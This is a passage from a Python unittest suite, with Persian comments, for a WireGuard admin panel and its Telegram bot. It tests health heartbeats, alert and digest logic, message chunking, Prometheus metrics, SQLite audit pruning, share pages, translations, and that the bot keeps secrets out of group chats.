            m.tg_api("T", "getUpdates", {"timeout": 30}, timeout=45)
        t = threading.Thread(target=bot_loop)
        t.start(); t.join()
        self.assertEqual(len(tried), 4)
        self.assertTrue(m.health_report()["threads"]["bot"]["ok"],
                        m.health_report()["threads"]["bot"])
        # نخِ بی‌نام (مثلاً درخواستِ وب) ضربانِ کسی را نمی‌زند
        with m._HEARTBEAT_LOCK:
            m._HEARTBEAT["bot"] = time.time() - 999
        t = threading.Thread(target=lambda: m.tg_api("T", "getMe"))
        t.start(); t.join()
        self.assertFalse(m.health_report()["threads"]["bot"]["ok"])
        # run() هم پیشرفت ثبت می‌کند (همان تابعی که alertmon صدا می‌زند)
        src = _read_panel_source()
        seg = src[src.index("def run(cmd, timeout=20):"):][:300]
        self.assertIn("_heartbeat_progress()", seg)

    def test_every_background_loop_beats(self):
        """هر نخی که health می‌سنجد باید در سورس ضربان بزند — وگرنه health
        همیشه آن را مرده می‌بیند (یا برعکس، نخی بی‌ناظر می‌ماند)."""
        src = _read_panel_source()
        beats = set(re.findall(r'_heartbeat\("([a-z]+)"\)', src))
        self.assertEqual(beats, set(self.m.HEARTBEAT_MAX_AGE))

    def test_health_route_accepts_the_metrics_token_or_sys_view(self):
        m = self.m
        m._HEARTBEAT.clear()
        m._STARTED_AT = time.time()
        for name in m.HEARTBEAT_MAX_AGE:
            m._heartbeat(name)
        h = make_fake_handler(m, path="/api/health", method="GET",
                              headers={"Authorization": "Bearer tok-123"},
                              session=None)
        h.do_GET()
        self.assertEqual(dict(h.sent)["__code__"], 200)
        obj = json.loads(b"".join(h.body).decode())
        self.assertTrue(obj["healthy"])
        self.assertIn("sampler", obj["threads"])
        # بدونِ توکن و بدونِ نشست → ۴۰۱
        h = make_fake_handler(m, path="/api/health", method="GET", session=None)
        h.do_GET()
        self.assertEqual(dict(h.sent)["__code__"], 401)
        # viewer (sys.view دارد) → ۲۰۰
        h = make_fake_handler(m, path="/api/health", method="GET",
                              session={"u": "v", "r": "viewer"})
        h.do_GET()
        self.assertEqual(dict(h.sent)["__code__"], 200)
        # نخِ مرده → ۵۰۳ ولی JSON
        m._STARTED_AT = time.time() - 3600
        with m._HEARTBEAT_LOCK:
            m._HEARTBEAT["sampler"] = time.time() - 999
        h = make_fake_handler(m, path="/api/health", method="GET",
                              headers={"Authorization": "Bearer tok-123"},
                              session=None)
        h.do_GET()
        self.assertEqual(dict(h.sent)["__code__"], 503)
        self.assertFalse(json.loads(b"".join(h.body).decode())["healthy"])

    # ---- persisted edges ----------------------------------------------------------
    def test_edge_state_survives_a_restart(self):
        m = self.m
        m.CONFIG["alerts"] = {"enabled": True}
        sent = []
        m.ALERTS.emit = lambda t, html=False: sent.append(t)
        m.ALERTS.state.clear()
        m.ALERTS.edge("tun:wg9", False, "down")          # اولین مشاهده: قطع، بی‌صدا
        self.assertEqual(sent, [])
        self.assertTrue(os.path.exists(m.ALERT_EDGES_STATE))
        # «ری‌استارت»: مدیرِ تازه، وضعیت از دیسک
        fresh = m.AlertManager()
        fresh.emit = lambda t, html=False: sent.append(t)
        fresh.load_state()
        self.assertEqual(fresh.state.get("tun:wg9"), False)
        fresh.edge("tun:wg9", True, "up")                # گذر به وصل → پیام
        self.assertEqual(sent, ["up"])
        # فایلِ خراب → بی‌صدا نادیده
        with open(m.ALERT_EDGES_STATE, "w") as f:
            f.write("{not json")
        m.AlertManager().load_state()

    # ---- throttle ------------------------------------------------------------------
    def test_expensive_warp_checks_are_throttled(self):
        m = self.m
        mon = m.AlertMonitor()
        self.assertTrue(mon._due("net:leak"))
        self.assertFalse(mon._due("net:leak"))
        mon._slow_last["net:leak"] -= mon.SLOW_EVERY["net:leak"] + 1
        self.assertTrue(mon._due("net:leak"))
        # سنجشِ ناشناخته: بدونِ throttle
        self.assertTrue(mon._due("x")); self.assertTrue(mon._due("x"))

    # ---- digest ----------------------------------------------------------------------
    def test_digest_day_is_marked_only_after_the_text_was_built(self):
        m = self.m
        m.CONFIG["alerts"] = {"enabled": True, "digest_enabled": True,
                              "digest_time": "00:00"}
        sent = []
        m.ALERTS.emit = lambda t, html=False: sent.append(t)
        mon = m.AlertMonitor()
        m.build_digest_text = lambda: 1 / 0
        mon._check_digest()
        self.assertEqual(sent, [])
        self.assertFalse(os.path.exists(m.DIGEST_STATE))     # روز ثبت نشده
        # تا ۱۰ دقیقه دوباره تلاش نمی‌کند
        m.build_digest_text = lambda: "ok-text"
        mon._check_digest()
        self.assertEqual(sent, [])
        mon._digest_retry_at = 0
        mon._check_digest()
        self.assertEqual(sent, ["ok-text"])
        self.assertTrue(os.path.exists(m.DIGEST_STATE))
        mon._check_digest()
        self.assertEqual(len(sent), 1)

    # ---- tg_api ------------------------------------------------------------------------
    def test_tg_chunks_splits_on_line_boundaries(self):
        m = self.m
        self.assertEqual(m.tg_chunks("short"), ["short"])
        lines = ["line-%03d %s" % (i, "x" * 60) for i in range(200)]
        parts = m.tg_chunks("\n".join(lines))
        self.assertGreater(len(parts), 1)
        for p in parts:
            self.assertLessEqual(len(p), m.TG_MAX_MESSAGE)
            self.assertFalse(p.startswith("\n") or p.endswith("\n"))
        self.assertEqual("\n".join(parts).split("\n"), lines)   # هیچ خطی گم نشد
        # خطِ تکیِ غول‌پیکر هم شکسته می‌شود
        parts = m.tg_chunks("y" * 9000, limit=4000)
        self.assertEqual([len(p) for p in parts], [4000, 4000, 1000])

    def test_tg_chunks_keeps_every_html_chunk_balanced(self):
        """برش وسطِ <pre> تکه‌ای با تگِ باز می‌ساخت و تلگرام کلِ آن را
        با «can't parse entities» رد می‌کرد."""
        import html.parser
        m = self.m
        body = "\n".join("AllowedIPs = 10.0.%d.0/24 &amp; x" % i
                         for i in range(400))
        text = "<b>Config</b>\n<pre><code class=\"language-ini\">" + body \
            + "</code></pre>\n<i>end</i>"
        parts = m.tg_chunks(text, html=True)
        self.assertGreater(len(parts), 2)

        class Bal(html.parser.HTMLParser):
            def __init__(self):
                super().__init__(); self.stack = []

            def handle_starttag(self, tag, attrs):
                self.stack.append(tag)

            def handle_endtag(self, tag):
                assert self.stack and self.stack[-1] == tag, (tag, self.stack)
                self.stack.pop()
        for part in parts:
            b = Bal(); b.feed(part); b.close()
            self.assertEqual(b.stack, [], part[:80])
        self.assertTrue(parts[1].startswith('<pre><code class="language-ini">'))
        # متن (بدونِ تگ‌های افزوده) کامل و به ترتیب رسید
        strip = lambda x: re.sub(r"<[^>]+>", "", x)
        self.assertEqual("\n".join(strip(p) for p in parts), strip(text))
        # خطِ غول‌پیکر وسطِ تگ یا &entity; بریده نمی‌شود
        long_line = ("ab&amp;" * 3000)
        for part in m.tg_chunks(long_line, limit=4000, html=True):
            self.assertFalse(re.search(r"&[a-z]*$", part), part[-10:])
        long_tag = "x" * 3997 + "<b>bold</b>" + "y" * 100   # برشِ ۴۰۰۰ وسطِ <b>
        parts = m.tg_chunks(long_tag, limit=4000, html=True)
        self.assertEqual(parts[0], "x" * 3997)
        self.assertTrue(parts[1].startswith("<b>bold</b>"))
        # بدونِ html، رفتارِ قبلی
        self.assertEqual(m.tg_chunks("y" * 9000, limit=4000),
                         ["y" * 4000, "y" * 4000, "y" * 1000])

    def _fake_https(self, script):
        """_https_raw_over_iface ِ ساختگی: script = {iface: [(status, json), …]}."""
        m = self.m
        calls = []

        def fake(host, port, req, iface, timeout):
            calls.append(iface)
            seq = script.get(iface) or [(0, None)]
            st, body = seq.pop(0) if len(seq) > 1 else seq[0]
            if body is None:
                raise OSError("unreachable")
            return st, json.dumps(body).encode()
        m._https_raw_over_iface = fake
        m.list_tunnel_confs = lambda: ["wg21"]
        m.systemd_state = lambda i: "active"
        m._TG_LAST_OK["iface"] = None
        return calls

    def test_tg_api_remembers_the_route_that_worked(self):
        m = self.m
        calls = self._fake_https({"": [(0, None)],
                                  "wg21": [(200, {"ok": True, "result": 1})]})
        self.assertEqual(m.tg_api("T", "getMe"), (True, 1))
        self.assertEqual(calls, ["", "wg21"])          # اول مستقیم، بعد تونل
        self.assertEqual(m.tg_api("T", "getMe"), (True, 1))
        self.assertEqual(calls[2:], ["wg21"])          # حالا اول تونل

    def test_tg_api_stops_on_forbidden_and_conflict(self):
        m = self.m
        for st in (403, 409):
            calls = self._fake_https({"": [(st, {"ok": False, "description": "nope"})],
                                      "wg21": [(200, {"ok": True, "result": 1})]})
            with self.subTest(status=st):
                self.assertEqual(m.tg_api("T", "getUpdates"), (False, "nope"))
                self.assertEqual(calls, [""])          # تعویضِ مسیر بی‌فایده

    def test_tg_api_honours_retry_after(self):
        m = self.m
        m.time = types.SimpleNamespace(**{k: getattr(m.time, k) for k in dir(m.time)
                                          if not k.startswith("__")})
        slept = []
        m.time.sleep = lambda s: slept.append(s)
        calls = self._fake_https({"": [(429, {"ok": False, "description": "slow",
                                              "parameters": {"retry_after": 3}}),
                                       (200, {"ok": True, "result": 7})]})
        self.assertEqual(m.tg_api("T", "sendMessage"), (True, 7))
        self.assertEqual(slept, [3])
        self.assertEqual(calls, ["", ""])              # همان مسیر، دو بار

    def test_bot_send_splits_long_messages_and_keeps_the_keyboard_last(self):
        m = self.m
        b = m.TelegramBot.__new__(m.TelegramBot)
        b._edit = None
        b._token = lambda: "T"
        sent = []
        m.tg_api = lambda tok, method, p, **kw: (sent.append(p), (True, {}))[1]
        long = "\n".join("row-%d %s" % (i, "z" * 80) for i in range(120))
        b.send(5, long, [[{"text": "b", "callback_data": "x"}]])
        self.assertGreater(len(sent), 1)
        self.assertTrue(all(len(p["text"]) <= m.TG_MAX_MESSAGE for p in sent))
        self.assertTrue(all("reply_markup" not in p for p in sent[:-1]))
        self.assertIn("reply_markup", sent[-1])
        sent.clear()
        m.CONFIG["alerts"] = {"enabled": True, "bot_token": "T", "chat_id": "1"}
        m.ALERTS.send_now("x" * 9000)
        self.assertEqual(len(sent), 3)


class ProductDataTests(unittest.TestCase):
    """بهبودهای داده: متریک‌های Prometheus، کشِ پارسِ کانفیگ، SQLite، رتبه‌بندیِ موازی."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-data-")
        self.m = load_module(self.tmp)
        with open(os.path.join(self.tmp, "wgtest.conf"), "w",
                  encoding="utf-8") as f:
            f.write(FIXTURE_CONF)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _user(self, **kw):
        u = {"iface": "wgtest", "name": "u1", "enabled": True, "online": True,
             "handshake": time.time() - 5, "rx": 100, "tx": 50, "rx_rate": 1.0,
             "tx_rate": 2.0, "month_rx": 10, "month_tx": 5, "life_rx": 1000,
             "life_tx": 500, "quota_gb": 2, "total_gb": None, "rate_mbit": 20,
             "expires": "2030-01-02", "auto_disabled": "", "live": True}
        u.update(kw)
        return u

    def test_metrics_expose_quota_expiry_sys_and_build_info(self):
        m = self.m
        m.build_stats = lambda: {
            "users": [self._user(), self._user(name='we"ird\\', live=False,
                                               quota_gb=None, rate_mbit="",
                                               expires="", auto_disabled="quota")],
            "tunnels": [], "interfaces": [],
            "sys": {"cur": {"cpu": 12.34, "ram": 50, "disk": 70.0}, "extra": {}}}
        m.META.svc_probe_add = getattr(m.META, "svc_probe_add", None)
        out = m.build_metrics()
        self.assertIn('wg_peer_quota_bytes{iface="wgtest",name="u1"} %d' % (2 * 1024 ** 3), out)
        self.assertIn('wg_peer_speed_limit_bits_per_second{iface="wgtest",name="u1"} 20000000', out)
        self.assertIn('wg_peer_lifetime_usage_bytes{iface="wgtest",name="u1",dir="rx"} 1000', out)
        exp_ts = int(m.datetime.strptime("2030-01-02", "%Y-%m-%d").timestamp())
        self.assertIn('wg_peer_expires_timestamp_seconds{iface="wgtest",name="u1"} %d' % exp_ts, out)
        self.assertIn('wg_peer_auto_disabled{iface="wgtest",name="we\\"ird\\\\",reason="quota"} 1', out)
        self.assertIn('panel_sys_usage_percent{resource="cpu"} 12.3', out)
        self.assertIn('wg_panel_build_info{version="%s"} 1' % m.BUILD_ID, out)
        self.assertRegex(m.BUILD_ID, r"^[0-9a-f]{12}$")
        self.assertIn("panel_thread_alive{", out)
        self.assertIn("wg_panel_uptime_seconds ", out)
        # شمارنده‌های *_total فقط برای peerِ حاضر در snapshotِ زنده
        self.assertIn('wg_peer_receive_bytes_total{iface="wgtest",name="u1"} 100', out)
        self.assertNotIn('wg_peer_receive_bytes_total{iface="wgtest",name="we', out)
        # مقدارِ برچسبِ escape‌شده: هیچ خطِ متریکی با کوتیشنِ باز نمانده
        lbl = r'\w+="(?:[^"\\]|\\.)*"'
        for line in out.splitlines():
            if line.startswith("#") or "{" not in line:
                continue
            body = line[line.index("{") + 1:line.rindex("}")]
            self.assertTrue(re.fullmatch(r"%s(,%s)*" % (lbl, lbl), body), line)

    def test_parse_user_blocks_is_cached_by_mtime_and_size(self):
        m = self.m
        calls = []
        real = m._parse_user_blocks
        m._parse_user_blocks = lambda lines: (calls.append(1), real(lines))[1]
        a = m.parse_user_blocks("wgtest")
        b = m.parse_user_blocks("wgtest")
        self.assertEqual(len(calls), 1)
        self.assertEqual(a, b)
        b[0]["name"] = "mutated"                      # کپی است، نه کش
        self.assertEqual(m.parse_user_blocks("wgtest")[0]["name"], "user01")
        # نوشتنِ فایل → کش باطل
        m.add_peer("wgtest", "newone", use_psk=False)
        names = [x["name"] for x in m.parse_user_blocks("wgtest")]
        self.assertIn("newone", names)
        self.assertGreaterEqual(len(calls), 2)
        # lines ِ صریح هیچ‌وقت کش نمی‌شود
        n = len(calls)
        m.parse_user_blocks("wgtest", ["#!!!x", "[Peer]", "PublicKey = K"])
        self.assertEqual(len(calls), n + 1)

    def test_audit_search_treats_percent_and_underscore_literally(self):
        m = self.m
        m.audit("admin", "peer", "peer.add", "a_b", "", "", True)
        m.audit("admin", "peer", "peer.add", "axb", "", "", True)
        m.audit("admin", "peer", "peer.add", "100%", "", "", True)
        self.assertEqual([r["target"] for r in m.META.audit_list(q="a_b")], ["a_b"])
        self.assertEqual([r["target"] for r in m.META.audit_list(q="100%")], ["100%"])
        self.assertEqual(len(m.META.audit_list(q="a")), 3)   # actor «admin» هم می‌خورد

    def test_prune_checkpoints_the_wal_without_error(self):
        m = self.m
        m.audit("admin", "peer", "peer.add", "x", "", "", True)
        m.META.prune()
        self.assertTrue(m.META.audit_list())

    def test_prune_expires_service_ips_and_mtr_history(self):
        """هرسِ روزانه باید svc_resolved و mtr_run را هم کران‌دار کند.

        این دو DELETE زیرِ `pass` ِ except ِ checkpoint افتاده بودند و
        هرگز اجرا نمی‌شدند.
        """
        m = self.m
        old = time.time() - 400 * 86400
        m.META.svc_resolved_upsert("svc", ["198.51.100.1"])
        m.META.mtr_add("svc", "wgtest", "198.51.100.1", 10, 1, 0, 4.4,
                       True, 3, "[]")
        con = m.META._connect()
        with con:
            con.execute("UPDATE svc_resolved SET first_seen=?, last_seen=?",
                        (old, old))
            con.execute("UPDATE mtr_run SET ts=?", (old,))
        con.close()
        m.META.prune()
        con = m.META._connect()
        left = (con.execute("SELECT COUNT(*) FROM svc_resolved").fetchone()[0],
                con.execute("SELECT COUNT(*) FROM mtr_run").fetchone()[0])
        con.close()
        self.assertEqual(left, (0, 0))

    def test_warp_rank_pings_the_pool_in_parallel_with_one_packet(self):
        m = self.m
        seen = []
        lock = threading.Lock()

        def slow_ping(ip, count=2, timeout=4):
            with lock:
                seen.append((ip, count, threading.current_thread().name))
            time.sleep(0.2)
            return 10.0
        m._ping_rtt = slow_ping
        m.WARP_GUARD_STATE = os.path.join(self.tmp, "none")
        t0 = time.time()
        k = m.warp_rank_endpoints()
        self.assertLess(time.time() - t0, 0.2 * len(m.WARP_EP_POOL) * 0.8)
        self.assertEqual(sorted(ip for ip, _c, _t in seen), sorted(m.WARP_EP_POOL))
        self.assertTrue(all(c == 1 for _ip, c, _t in seen))
        self.assertEqual(len(k["endpoints"]), len(m.WARP_EP_POOL))


class ProductUxI18nTests(unittest.TestCase):
    """صفحه‌ی اشتراک، گیتِ چتِ خصوصیِ ربات، ترجمه‌های باقی‌مانده، traceroute، ifb."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-ux-")
        self.m = load_module(self.tmp)
        with open(os.path.join(self.tmp, "wgtest.conf"), "w",
                  encoding="utf-8") as f:
            f.write(FIXTURE_CONF)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    # ---- صفحه‌ی اشتراک -----------------------------------------------------------
    def test_share_page_carries_link_validity_expiry_copy_and_a_safe_filename(self):
        m = self.m
        m.add_peer("wgtest", "a-very-long-device-name-here", use_psk=False)
        tok, err = m.create_share("wgtest", "a-very-long-device-name-here", 30, False, "admin")
        self.assertIsNone(err)
        res = m.resolve_share(tok)
        self.assertGreater(res["link_expires"], time.time())
        res["expires"] = "2030-05-06"
        html = m.render_share_page(res, None, "en")
        self.assertIn('"link_expires": %d' % int(res["link_expires"]), html)
        self.assertIn('"expires": "2030-05-06"', html)
        self.assertIn('<meta name="robots" content="noindex, nofollow">', html)
        self.assertIn('onclick="cp()"', html)
        self.assertIn("Copy config", html)
        self.assertIn("slice(0, 15)", html)
        self.assertIn("ui.share.linkuntil", html)        # کلید در _T ِ تزریق‌شده

    def test_share_rate_limit_message_is_translated(self):
        m = self.m
        m.share_rate_ok = lambda ip: False
        for lang, word in (("en", "Too many"), ("fa", "بیش از حد")):
            h = make_fake_handler(m, path="/s/abc?lang=" + lang, method="GET",
                                  headers={"Cookie": ""})
            h.do_GET()
            self.assertEqual(dict(h.sent)["__code__"], 429)
            self.assertIn(word, b"".join(h.body).decode())

    # ---- ربات: چتِ خصوصی -----------------------------------------------------------
    def _bot(self):
        m = self.m
        b = m.TelegramBot.__new__(m.TelegramBot)
        b.convo = {}; b._edit = None; b._chat_type = None; b._lang = "en"
        b._token = lambda: "T"
        sent = []
        m.tg_api = lambda tok, method, p=None, **kw: (sent.append((method, p)), (True, {}))[1]
        return b, sent

    def test_secrets_are_refused_outside_a_private_chat(self):
        m = self.m
        b, sent = self._bot()
        m.META.proxy_user_upsert("pxu", {"pass_hash": "h", "pass_plain": "secret-pw",
                                         "rate_kbit": 0, "quota_gb": 0, "expires": "",
                                         "enabled": 1, "note": ""})
        m.CONFIG["bot"] = {"enabled": True, "users": [{"id": "1", "role": "admin",
                                                        "lang": "en"}]}
        b._chat_type = "supergroup"
        b._send_wg_conf(7, "u", "[Interface]\nPrivateKey = PRIV\n")
        b._px_conf(7, "pxu")
        b._apply(1, 7, {"kind": "px", "act": "pwd", "name": "pxu"})
        joined = json.dumps([p for _mth, p in sent], ensure_ascii=False)
        self.assertNotIn("PRIV", joined)
        self.assertNotIn("secret-pw", joined)
        self.assertEqual(len(sent), 3)
        self.assertTrue(all("private chat" in p["text"] for _mth, p in sent))
        self.assertEqual(m.META.proxy_user_get("pxu")["pass_plain"], "secret-pw")
        # چتِ خصوصی: مثلِ قبل
        sent.clear()
        b._chat_type = "private"
        b._px_conf(7, "pxu")
        self.assertIn("secret-pw", json.dumps([p for _m, p in sent], ensure_ascii=False))

    def test_creation_wizards_are_refused_in_a_group(self):
        """ویزاردهای ساختِ وایرگارد/پروکسی فقط در چتِ خصوصی.

        ویزاردِ وایرگارد در گروه peer را می‌ساخت و بعد تحویلِ کانفیگ رد
        می‌شد؛ ویزاردِ پروکسی رمز را در تأیید و پیامِ نهایی چاپ می‌کرد.
        """
        m = self.m
        b, sent = self._bot()
        m.CONFIG["bot"] = {"enabled": True, "users": [{"id": "1", "role": "admin",
                                                        "lang": "en"}]}
        b._chat_type = "supergroup"
        b._start_wg_add(1, -5)
        b._start_px_add(1, -5)
        b._wg_add_cb(1, -5, "go", set())
        b._px_add_cb(1, -5, "go", set())
        self.assertEqual(b.convo, {})
        self.assertEqual(len(sent), 4)
        self.assertTrue(all("private chat" in p["text"] for _mth, p in sent))

    def test_group_text_is_not_input_to_a_private_wizard(self):
        """گفت‌وگو با کاربر کلید خورده، نه با چت: متنِ گروهی نباید مرحله‌ی
        رمزِ ویزاردِ خصوصی را پر کند."""
        m = self.m
        b, sent = self._bot()
        m.CONFIG["bot"] = {"enabled": True, "users": [{"id": "1", "role": "admin",
                                                        "lang": "en"}]}
        b._chat_type = "private"
        b._start_px_add(1, 1)
        b.convo[1]["step"] = "pass"
        sent.clear()
        b._chat_type = "supergroup"
        b._convo_step(1, -5, "group-typed-secret")
        self.assertEqual(sent, [])
        self.assertEqual(b.convo[1]["pw"], "")
        self.assertEqual(b.convo[1]["step"], "pass")

    def test_bot_stays_silent_for_strangers_in_groups(self):
        m = self.m
        b, sent = self._bot()
        m.CONFIG["bot"] = {"enabled": True, "users": [{"id": "1", "role": "admin"}]}
        stranger = {"message": {"from": {"id": 999}, "chat": {"id": -5, "type": "supergroup"},
                                "text": "/start"}}
        b._dispatch_inner(stranger)
        self.assertEqual(sent, [])
        stranger["message"]["chat"] = {"id": 999, "type": "private"}
        b._dispatch_inner(stranger)
        self.assertEqual(len(sent), 1)          # در خصوصی: پیامِ «مجاز نیستید» + شناسه

    # ---- i18n --------------------------------------------------------------------------
    def test_audit_details_of_peer_and_user_edits_are_catalog_keys(self):
        m = self.m
        m.CONFIG["users"] = [{"username": "admin", "salt": "a" * 32, "hash": "h",
                              "role": "admin", "totp": "", "stoken": "s"},
                             {"username": "bob", "salt": "a" * 32, "hash": "h",
                              "role": "viewer", "totp": "", "stoken": "s",
                              "active": True}]
        m.save_config = lambda: None

        def post(path, body):
            h = make_fake_handler(m, path=path, method="POST", body=body,
                                  headers={"Cookie": "wgl=en"},
                                  session={"u": "admin", "r": "admin"})
            h.do_POST()
            return json.loads(b"".join(h.body).decode())
        self.assertTrue(post("/api/peer/add", {"iface": "wgtest", "name": "p1",
                                               "quota_gb": 5, "rate_mbit": 10})["ok"])
        self.assertTrue(post("/api/peer/meta", {"iface": "wgtest", "name": "p1",
                                                "note": "hi", "quota_gb": 3})["ok"])
        self.assertTrue(post("/api/users/edit", {"username": "bob", "role": "admin",
                                                 "expires": "2030-01-01"})["ok"])
        rows = {r["action"]: r["detail"] for r in m.META.audit_list(limit=20)}
        for act in ("peer.add", "peer.edit", "pu.edit"):
            with self.subTest(action=act):
                self.assertTrue(rows[act].startswith('{"k":"ui.audit.det.'), rows[act])
                self.assertFalse(re.search(r"[\u0600-\u06FF]", rows[act]), rows[act])
        en = m.audit_detail_text(rows["peer.add"], "en")
        o = json.loads(en)
        self.assertEqual(o["p"]["quota"], 5.0)
        self.assertEqual(o["p"]["psk"], "1")
        o = json.loads(m.audit_detail_text(rows["pu.edit"], "en"))
        self.assertEqual(o["p"]["role"], "viewer→admin")
        self.assertEqual(o["p"]["exp"], "2030-01-01")
        self.assertEqual(o["p"]["pw"], "0")

    def test_digest_and_time_ago_follow_the_owner_language(self):
        m = self.m
        m.CONFIG["bot"] = {"enabled": True,
                           "users": [{"id": "1", "role": "owner", "lang": "en"}]}
        m.build_stats = lambda: {"users": []}
        txt = m.build_digest_text()
        self.assertIn("Status summary", txt)
        self.assertIn("WireGuard", txt)
        self.assertFalse(re.search(r"[\u0600-\u06FF]", txt), txt)
        self.assertEqual(m._ago_srv(time.time() - 300, "en"), "5 min ago")
        self.assertEqual(m._ago_srv(time.time() - 300, "fa"), "۵ دقیقه پیش")
        self.assertEqual(m._ago_srv(time.time() - 300), "5 min ago")   # زبانِ مالک
        m.CONFIG["bot"]["users"][0]["lang"] = "fa"
        self.assertIn("خلاصهٔ وضعیت", m.build_digest_text())

    def test_startup_alert_and_speedtest_busy_error_are_catalog_keys(self):
        src = _read_panel_source()
        self.assertIn("A('alert.startup'", src)
        self.assertNotIn('ALERTS.emit("پنلِ', src)
        self.assertIn('"api.err.speed.running"', src)
        self.assertIn(m_key := "api.err.speed.running", self.m.I18N)

    # ---- traceroute / ifb ---------------------------------------------------------------
    def test_services_status_reports_traceroute_not_mtr(self):
        m = self.m
        m.shutil = types.SimpleNamespace(**{k: getattr(m.shutil, k) for k in dir(m.shutil)
                                            if not k.startswith("__")})
        m.shutil.which = lambda name: "/usr/bin/x" if name == "traceroute" else None
        st = m.build_svc_status()
        self.assertTrue(st["has_traceroute"])
        self.assertNotIn("has_mtr", st)
        self.assertIn("s.has_traceroute === false", _read_panel_source())

    def test_shaper_loads_the_ifb_module_and_logs_when_it_is_missing(self):
        m = self.m
        del m._run_calls[:]
        m.SHAPER._build("wgtest", {"10.0.0.5": 5})
        self.assertIn(["modprobe", "ifb"], m._run_calls)
        orig = m.run
        m.run = lambda cmd, timeout=20: ((2, "", "RTNETLINK: Operation not supported")
                                        if cmd[:3] == ["ip", "link", "add"]
                                        else orig(cmd, timeout))
        m.SHAPER._build("wgtest", {"10.0.0.5": 5})
        with open(m.ACTION_LOG, encoding="utf-8") as f:
            self.assertIn("upload limits on wgtest are NOT enforced", f.read())


if __name__ == "__main__":
    unittest.main()
